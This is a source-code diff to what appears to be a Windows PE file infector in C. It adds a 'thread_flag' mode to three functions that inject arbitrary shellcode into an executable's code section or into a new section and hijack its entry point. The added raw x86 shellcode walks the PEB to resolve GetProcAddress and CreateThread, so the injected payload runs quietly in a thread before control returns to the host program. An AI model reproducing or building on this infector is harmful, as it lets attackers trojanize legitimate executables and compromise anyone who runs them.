@@ -15,7 +15,7 @@
 
 
 
-int pe_infect_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size) {
+int pe_infect_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, int thread_flag) {
 	if (!nt_header || !sections || !xcode || *xcode == '\0') {
 		return -1;
 	}
@@ -77,13 +77,23 @@ int pe_infect_section(pe_nt_header* nt_header, list_pe_section_t sections, unsig
 	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF };
 	char jmp_eax_nop_bytecode[] = "\xff\xe0\x90";
 	
-	if (codeSect->header.SizeOfRawData - injection_xcode_offset - 8 < xcode_size) {
+	if (codeSect->header.SizeOfRawData - injection_xcode_offset - 8 - thread_flag ? 0x99 : 0 < xcode_size) {
 		//not enough space for xcode
 		return -5;
 	}
 	
 	//new entry point
 	nt_header->nt_optional_header.address_of_entry_point = codeSect->header.VirtualAddress + injection_xcode_offset;
+	
+	uint32_t threadfunc_addr = nt_header->nt_optional_header.address_of_entry_point + 0x86 + nt_header->nt_optional_header.image_base;
+	char peb_create_thread_mov_ecx[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda"
+									"\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75"
+									"\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01"
+									"\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x72"
+									"\x65\x61\x64\x68\x74\x65\x54\x68\x68\x43\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\x51\x51\x51\xb9";
+	char peb_create_thread_hex_threadfunc[] = { (char)(threadfunc_addr) & 0xFF, (char)(threadfunc_addr >> 8) & 0xFF, (char)(threadfunc_addr >> 16) & 0xFF, (char)(threadfunc_addr >> 24) & 0xFF };
+	char peb_create_thread_push_ecx_call_eax[] = "\x51\x31\xc9\x51\x51\xff\xd0";
+	char threadfunc_prologue[] = "\x55\x89\xe5";
 	
 	fprintf(stdout, "original entry point 0x%08X\n", original_entry_point);
 	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
@@ -93,10 +103,23 @@ int pe_infect_section(pe_nt_header* nt_header, list_pe_section_t sections, unsig
 	fprintf(stdout, "dll_characteristics 0x%04X\n", nt_header->nt_optional_header.dll_characteristics);
 	
 	//xcode injection
-	memcpy(codeSect->data + injection_xcode_offset, xcode, xcode_size);
-	memcpy(codeSect->data + injection_xcode_offset + xcode_size, mov_eax_bytecode, sizeof(mov_eax_bytecode));
-	memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
-	memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
+	if (thread_flag) {
+		memcpy(codeSect->data + injection_xcode_offset, peb_create_thread_mov_ecx, sizeof(peb_create_thread_mov_ecx));
+		memcpy(codeSect->data + injection_xcode_offset + sizeof(peb_create_thread_mov_ecx) - 1, peb_create_thread_hex_threadfunc, sizeof(peb_create_thread_hex_threadfunc));
+		memcpy(codeSect->data + injection_xcode_offset + sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc), peb_create_thread_push_ecx_call_eax, sizeof(peb_create_thread_push_ecx_call_eax));	
+		injection_xcode_offset += sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc) + sizeof(peb_create_thread_push_ecx_call_eax);
+		//after create thread - goto original entry point
+		memcpy(codeSect->data + injection_xcode_offset - 1, mov_eax_bytecode, sizeof(mov_eax_bytecode));
+		memcpy(codeSect->data + injection_xcode_offset - 2 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
+		memcpy(codeSect->data + injection_xcode_offset - 2 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
+		memcpy(codeSect->data + injection_xcode_offset - 3 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode), threadfunc_prologue, sizeof(threadfunc_prologue));
+		memcpy(codeSect->data + injection_xcode_offset - 4 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode) + sizeof(threadfunc_prologue), xcode, xcode_size);
+	} else {
+		memcpy(codeSect->data + injection_xcode_offset, xcode, xcode_size);
+		memcpy(codeSect->data + injection_xcode_offset + xcode_size, mov_eax_bytecode, sizeof(mov_eax_bytecode));
+		memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
+		memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
+	}
 	
 	return 0;
 }
@@ -187,7 +210,7 @@ int pe64_infect_section(pe64_nt_header* nt_header, list_pe_section_t sections, u
 	return 0;
 }
 
-int pe_infect_new_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, const char* new_section_name) {
+int pe_infect_new_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, const char* new_section_name, int thread_flag) {
 	if (!nt_header || !sections || !xcode || *xcode == '\0' || !new_section_name || *new_section_name == '\0') {
 		return -1;
 	}
@@ -236,9 +259,11 @@ int pe_infect_new_section(pe_nt_header* nt_header, list_pe_section_t sections, u
 	//fill header
 	memset(&newSect->header, 0, sizeof(pe_section_header));
 	strncpy(newSect->header.name, new_section_name, SECTION_SHORT_NAME_LENGTH);
-	newSect->header.Misc.VirtualSize = P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.section_alignment);
+	newSect->header.Misc.VirtualSize = thread_flag ? P2ALIGNUP(xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.section_alignment)
+								:	P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.section_alignment);
 	newSect->header.VirtualAddress = P2ALIGNUP(higher_virtual_offset + higher_virtual_size, nt_header->nt_optional_header.section_alignment);
-	newSect->header.SizeOfRawData = P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.file_alignment);
+	newSect->header.SizeOfRawData = thread_flag ? P2ALIGNUP(xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.file_alignment)
+								:	P2ALIGNUP(xcode_size + 0x8, nt_header->nt_optional_header.file_alignment);
 	newSect->header.PointerToRawData = higher_raw_offset + higher_raw_size;
 	newSect->header.Characteristics = SECTION_CHARACTER_MEM_EXECUTE | SECTION_CHARACTER_MEM_READ | SECTION_CHARACTER_EXECUTABLE;
 	//fill section data
@@ -261,10 +286,36 @@ int pe_infect_new_section(pe_nt_header* nt_header, list_pe_section_t sections, u
 	char hex_original_entry_point[] = { (char)(original_entry_point) & 0xFF, (char)(original_entry_point >> 8) & 0xFF, (char)(original_entry_point >> 16) & 0xFF, (char)(original_entry_point >> 24) & 0xFF };
 	char jmp_eax_nop_bytecode[] = "\xff\xe0\x90";
 	
-	memcpy(newSect->data, xcode, xcode_size);
-	memcpy(newSect->data + xcode_size, mov_eax_bytecode, sizeof(mov_eax_bytecode));
-	memcpy(newSect->data + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
-	memcpy(newSect->data + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
+	//for thread prologue
+	uint32_t threadfunc_addr = nt_header->nt_optional_header.image_base + 0x86 + newSect->header.VirtualAddress;
+	char peb_create_thread_mov_ecx[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda"
+									"\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75"
+									"\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01"
+									"\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x72"
+									"\x65\x61\x64\x68\x74\x65\x54\x68\x68\x43\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\x51\x51\x51\xb9";
+									
+	char peb_create_thread_hex_threadfunc[] = { (char)(threadfunc_addr) & 0xFF, (char)(threadfunc_addr >> 8) & 0xFF, (char)(threadfunc_addr >> 16) & 0xFF, (char)(threadfunc_addr >> 24) & 0xFF };
+	char peb_create_thread_push_ecx_call_eax[] = "\x51\x31\xc9\x51\x51\xff\xd0";
+	char threadfunc_prologue[] = "\x55\x89\xe5";
+	
+	if (thread_flag) {
+		memcpy(newSect->data, peb_create_thread_mov_ecx, sizeof(peb_create_thread_mov_ecx));
+		memcpy(newSect->data + sizeof(peb_create_thread_mov_ecx) - 1, peb_create_thread_hex_threadfunc, sizeof(peb_create_thread_hex_threadfunc));
+		memcpy(newSect->data + sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc), peb_create_thread_push_ecx_call_eax, sizeof(peb_create_thread_push_ecx_call_eax));	
+		//injection_xcode_offset += sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc) + sizeof(peb_create_thread_push_ecx_call_eax);
+		uint32_t offset = sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc) + sizeof(peb_create_thread_push_ecx_call_eax);
+		//after create thread - goto original entry point
+		memcpy(newSect->data + offset - 1, mov_eax_bytecode, sizeof(mov_eax_bytecode));
+		memcpy(newSect->data + offset - 2 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
+		memcpy(newSect->data + offset - 2 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
+		memcpy(newSect->data + offset - 3 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode), threadfunc_prologue, sizeof(threadfunc_prologue));
+		memcpy(newSect->data + offset - 4 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode) + sizeof(threadfunc_prologue), xcode, xcode_size);
+	} else {
+		memcpy(newSect->data, xcode, xcode_size);
+		memcpy(newSect->data + xcode_size, mov_eax_bytecode, sizeof(mov_eax_bytecode));
+		memcpy(newSect->data + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
+		memcpy(newSect->data + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
+	}
 	
 	//write jmp prologue in code section
 	uint32_t injection_offset = 0;
@@ -459,7 +510,7 @@ int pe64_infect_new_section(pe64_nt_header* nt_header, list_pe_section_t section
 	return 0;
 }
 
-int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size) {
+int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections, unsigned char* xcode, uint32_t xcode_size, int thread_flag) {
 	if (!nt_header || !sections || !xcode || *xcode == '\0') {
 		return -1;
 	}
@@ -497,13 +548,18 @@ int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections
 	}
 	
 	//resize code sect
-	uint32_t newVirtualSize = P2ALIGNUP(codeSect->header.Misc.VirtualSize + xcode_size + 0x8, nt_header->nt_optional_header.section_alignment);
-	uint32_t newRawSize = P2ALIGNUP(codeSect->header.SizeOfRawData + xcode_size + 0x8, nt_header->nt_optional_header.file_alignment);
+	uint32_t newVirtualSize = thread_flag ? P2ALIGNUP(codeSect->header.Misc.VirtualSize + xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.section_alignment)
+							:	P2ALIGNUP(codeSect->header.Misc.VirtualSize + xcode_size + 0x8, nt_header->nt_optional_header.section_alignment);
+	uint32_t newRawSize = thread_flag ? P2ALIGNUP(codeSect->header.Misc.VirtualSize + xcode_size + 0x8 + 0x99, nt_header->nt_optional_header.section_alignment)
+						:	P2ALIGNUP(codeSect->header.SizeOfRawData + xcode_size + 0x8, nt_header->nt_optional_header.file_alignment);
 	
-	if ((newVirtualSize + codeSect->header.VirtualAddress) > nearSect->header.VirtualAddress) {
+	if (nearSect && ((newVirtualSize + codeSect->header.VirtualAddress) > nearSect->header.VirtualAddress)) {
 		//not possible for resizing section
 		return -3;
 	}
+	
+	fprintf(stdout, "newVirtualSize + codeSect->header.VirtualAddress: 0x%04X\n", newVirtualSize + codeSect->header.VirtualAddress);
+	fprintf(stdout, "nearSect->header.VirtualAddress: 0x%04X\n", nearSect->header.VirtualAddress);
 	
 	uint32_t injection_xcode_offset = codeSect->header.SizeOfRawData;
 	uint32_t diff_rawSize = newRawSize - codeSect->header.SizeOfRawData;
@@ -535,6 +591,17 @@ int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections
 	//new entry point
 	nt_header->nt_optional_header.address_of_entry_point = codeSect->header.VirtualAddress + injection_xcode_offset;
 	
+	//for thread prologue
+	uint32_t threadfunc_addr = nt_header->nt_optional_header.address_of_entry_point + 0x86 + nt_header->nt_optional_header.image_base;
+	char peb_create_thread_mov_ecx[] = "\x31\xc9\x64\x8b\x41\x30\x8b\x40\x0c\x8b\x70\x14\xad\x96\xad\x8b\x58\x10\x8b\x53\x3c\x01\xda"
+									"\x8b\x52\x78\x01\xda\x8b\x72\x20\x01\xde\x31\xc9\x41\xad\x01\xd8\x81\x38\x47\x65\x74\x50\x75"
+									"\xf4\x81\x78\x04\x72\x6f\x63\x41\x75\xeb\x81\x78\x08\x64\x64\x72\x65\x75\xe2\x8b\x72\x24\x01"
+									"\xde\x66\x8b\x0c\x4e\x49\x8b\x72\x1c\x01\xde\x8b\x14\x8e\x01\xda\x31\xc9\x53\x52\x51\x68\x72"
+									"\x65\x61\x64\x68\x74\x65\x54\x68\x68\x43\x72\x65\x61\x54\x53\xff\xd2\x31\xc9\x51\x51\x51\xb9";
+	char peb_create_thread_hex_threadfunc[] = { (char)(threadfunc_addr) & 0xFF, (char)(threadfunc_addr >> 8) & 0xFF, (char)(threadfunc_addr >> 16) & 0xFF, (char)(threadfunc_addr >> 24) & 0xFF };
+	char peb_create_thread_push_ecx_call_eax[] = "\x51\x31\xc9\x51\x51\xff\xd0";
+	char threadfunc_prologue[] = "\x55\x89\xe5";
+	
 	fprintf(stdout, "original entry point 0x%08X\n", original_entry_point);
 	fprintf(stdout, "injection new_entry_point 0x%08X\n", nt_header->nt_optional_header.address_of_entry_point);
 	
@@ -543,10 +610,23 @@ int pe_infect_resize_section(pe_nt_header* nt_header, list_pe_section_t sections
 	fprintf(stdout, "dll_characteristics 0x%04X\n", nt_header->nt_optional_header.dll_characteristics);
 	
 	//xcode injection
-	memcpy(codeSect->data + injection_xcode_offset, xcode, xcode_size);
-	memcpy(codeSect->data + injection_xcode_offset + xcode_size, mov_eax_bytecode, sizeof(mov_eax_bytecode));
-	memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
-	memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
+	if (thread_flag) {
+		memcpy(codeSect->data + injection_xcode_offset, peb_create_thread_mov_ecx, sizeof(peb_create_thread_mov_ecx));
+		memcpy(codeSect->data + injection_xcode_offset + sizeof(peb_create_thread_mov_ecx) - 1, peb_create_thread_hex_threadfunc, sizeof(peb_create_thread_hex_threadfunc));
+		memcpy(codeSect->data + injection_xcode_offset + sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc), peb_create_thread_push_ecx_call_eax, sizeof(peb_create_thread_push_ecx_call_eax));	
+		injection_xcode_offset += sizeof(peb_create_thread_mov_ecx) - 1 + sizeof(peb_create_thread_hex_threadfunc) + sizeof(peb_create_thread_push_ecx_call_eax);
+		//after create thread - goto original entry point
+		memcpy(codeSect->data + injection_xcode_offset - 1, mov_eax_bytecode, sizeof(mov_eax_bytecode));
+		memcpy(codeSect->data + injection_xcode_offset - 2 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
+		memcpy(codeSect->data + injection_xcode_offset - 2 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
+		memcpy(codeSect->data + injection_xcode_offset - 3 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode), threadfunc_prologue, sizeof(threadfunc_prologue));
+		memcpy(codeSect->data + injection_xcode_offset - 4 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point) + sizeof(jmp_eax_nop_bytecode) + sizeof(threadfunc_prologue), xcode, xcode_size);
+	} else {	
+		memcpy(codeSect->data + injection_xcode_offset, xcode, xcode_size);
+		memcpy(codeSect->data + injection_xcode_offset + xcode_size, mov_eax_bytecode, sizeof(mov_eax_bytecode));
+		memcpy(codeSect->data + injection_xcode_offset + xcode_size - 1 + sizeof(mov_eax_bytecode), hex_original_entry_point, sizeof(hex_original_entry_point));
+		memcpy(codeSect->data + injection_xcode_offset + xcode_size  - 1 + sizeof(mov_eax_bytecode) + sizeof(hex_original_entry_point), jmp_eax_nop_bytecode, sizeof(jmp_eax_nop_bytecode));
+	}
 	
 	return 0;
 }
